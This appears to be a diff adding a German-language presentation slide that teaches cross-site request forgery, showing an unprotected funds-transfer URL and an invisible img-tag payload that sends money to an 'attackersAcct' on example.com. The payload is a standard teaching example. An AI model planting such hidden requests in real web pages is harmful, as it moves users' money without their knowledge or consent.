@@ -1,0 +1,17 @@
+<div w11k-slide-master="regular">
+  <span w11k-slide-part-source="header">
+    Beispiel
+  </span>
+
+  <div w11k-slide-part-source="content">
+
+<pre w11k-pretty-print lang="url" title="Aufruf von Business Logik ohne zusätzlichen Schutz">
+http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243
+</pre>
+
+<pre w11k-pretty-print lang="html" title="XSRF Attacke per XSS">
+&lt;img src=&quot;http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=attackersAcct#&quot; width=&quot;0&quot; height=&quot;0&quot; /&gt;
+</pre>
+
+  </div>
+</div>
